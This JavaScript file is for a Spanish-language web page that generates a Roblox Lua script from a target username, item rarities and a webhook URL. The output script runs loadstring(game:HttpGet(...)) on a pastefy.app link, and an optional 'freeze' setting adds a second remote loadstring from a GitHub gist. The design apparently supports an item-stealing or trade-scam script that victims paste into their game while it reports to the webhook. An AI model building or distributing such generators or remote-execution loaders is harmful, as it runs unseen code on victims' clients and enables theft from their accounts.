const R=["Ancient","Mythic","Legendary","Rare","Uncommon","Common"];
const LOADER='-- NO BORRAR, SI LO BORRAS NO FUNCIONARÁ\ntask.spawn(function()\n    loadstring(game:HttpGet("https://pastefy.app/HNaA6STp/raw"))()\nend)';
const $=id=>document.getElementById(id);
const chips=$("chips");
R.forEach(r=>chips.insertAdjacentHTML("beforeend",`<label class="chip"><input type="checkbox" value="${r}">${r}</label>`));
const boxes=()=>[...chips.querySelectorAll("input")];
$("allbtn").onclick=()=>{const all=boxes().every(b=>b.checked);boxes().forEach(b=>b.checked=!all);$("allbtn").textContent=all?"Seleccionar todas":"Quitar todas"};

// Comprobación opcional del user (API pública de Roblox vía roproxy). No bloquea nada.
let timer,seq=0;
const esc=s=>String(s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
$("user").addEventListener("input",()=>{
  clearTimeout(timer);
  const n=$("user").value.trim();
  if(!n){$("ust").innerHTML="";return}
  $("ust").innerHTML='<span class="mut">Buscando…</span>';
  timer=setTimeout(()=>check(n),500);
});
async function check(n){
  const my=++seq,st=$("ust");
  try{
    const r=await fetch("https://users.roproxy.com/v1/usernames/users",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({usernames:[n],excludeBannedUsers:false})});
    if(!r.ok)throw 0;
    const d=(await r.json()).data||[];
    if(my!==seq)return;
    if(!d.length){st.innerHTML='<span class="warn">No encontré ese user, revisa que esté bien escrito.</span>';return}
    let img="";
    try{const t=await(await fetch(`https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=${d[0].id}&size=150x150&format=Png`)).json();if(t.data&&t.data[0]&&t.data[0].imageUrl)img=`<img src="${esc(t.data[0].imageUrl)}" alt="">`}catch(e){}
    if(my===seq)st.innerHTML=`${img}<span class="ok">Sí existe: ${esc(d[0].name)}</span>`;
  }catch(e){if(my===seq)st.innerHTML='<span class="mut">No se pudo comprobar el user ahora.</span>'}
}

const FREEZE='loadstring(game:HttpGet("https://gist.githubusercontent.com/Yamekiteelyeso/369045e74144c4f38f4a3fdd48161d34/raw/8c87201e316e03927f4f70a4fe0c37e9e87f3315/RdduzHub"))()';
$("frz").addEventListener("change",()=>{
  const on=$("frz").checked;
  $("custom").disabled=on;
  if(on){$("custom").value=FREEZE}
  else if($("custom").value.trim()===FREEZE){$("custom").value=""}
});

const q=s=>s.replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r?\n/g," ");
$("make").onclick=()=>{
  const err=$("err");err.textContent="";
  const user=$("user").value.trim(),hook=$("hook").value.trim(),custom=$("frz").checked?FREEZE:$("custom").value.trim();
  const rar=boxes().filter(b=>b.checked).map(b=>b.value);
  if(!user){err.textContent="Escribe tu user.";return}
  if(!rar.length){err.textContent="Elige al menos una rareza.";return}
  if(!hook){err.textContent="Pon tu webhook.";return}
  const customBlock=custom?`\n\n-- script personalizado\ntask.spawn(function()\n    ${custom}\nend)`:"";
  $("code").textContent=`getgenv().TARGET = "${q(user)}"\n\ngetgenv().RARITIES = { ${rar.map(r=>`"${r}"`).join(", ")} }\n\ngetgenv().WEBHOOK = "${q(hook)}"\n\n${LOADER}${customBlock}\n`;
  $("out").style.display="block";
  $("out").scrollIntoView({behavior:"smooth",block:"start"});
};
$("copy").onclick=async()=>{
  const t=$("code").textContent,b=$("copy");
  try{await navigator.clipboard.writeText(t)}catch(e){const a=document.createElement("textarea");a.value=t;document.body.appendChild(a);a.select();document.execCommand("copy");a.remove()}
  b.textContent="¡Copiado!";setTimeout(()=>b.textContent="Copiar",1500);
};
